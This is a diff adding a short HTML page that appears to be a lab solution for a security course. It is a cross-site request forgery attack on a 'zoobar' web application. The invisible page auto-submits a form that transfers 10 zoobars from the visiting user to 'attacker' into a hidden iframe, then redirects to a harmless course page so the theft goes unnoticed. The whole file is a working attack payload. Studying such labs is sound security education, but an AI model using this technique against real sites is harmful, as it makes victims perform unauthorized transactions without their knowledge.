@@ -1,0 +1,19 @@
+<! DOCTYPE html>
+<html>
+  <head>
+    <style>
+      body {visibility:hidden; height:0; width:0; position:absolute;}
+    </style>
+  </head> 
+  <body>
+    <form id="testi" method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer" target="itest">
+      <input name="zoobars" value="10" type="text"></input>
+      <input name="recipient" value="attacker" type="text"></input>
+      <input name="submission" value="Send" type="submit"></input>
+    </form>
+    <iframe name="itest" id="itest" src="" onload="window.location.href='http://css.csail.mit.edu/6.858/2014/'"></iframe>
+    <script type="text/javascript">
+      document.getElementById("testi").submit();
+    </script>
+  </body>
+</html>
